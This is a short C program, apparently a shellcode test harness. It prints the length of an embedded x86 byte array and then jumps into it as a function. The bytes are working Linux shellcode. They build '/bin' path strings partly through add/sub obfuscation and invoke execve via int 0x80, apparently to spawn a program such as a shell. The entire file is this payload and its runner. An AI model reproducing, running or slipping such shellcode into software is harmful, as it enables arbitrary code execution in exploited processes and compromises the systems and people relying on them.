#include<stdio.h>
#include<string.h>

unsigned char code[] =  "\x31\xdb\x89\xd8\x89\xda\xb8\xce\xfe\xce\xee\x2d\x9b\xcb\x97\xb7\x50\x2d\x06\xbd\xc6\x05\x50\x89\xe2\x53\x05\x41\xb9\x02\x37\x50\x68\x65\x2f\x62\x69\x05\xbf\x3c\x03\x0e\x50\x89\xe1\x53\x2d\xfe\x3c\x08\x13\x50\x66\x50\x66\x50\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x50\x52\x51\x53\x31\xd2\x89\xe1\xb0\x0b\xcd\x80";



main()
{
	printf("Shellcode Length: %d\n",strlen(code));
	int (*ret) () = (int(*)())code;
	ret();
}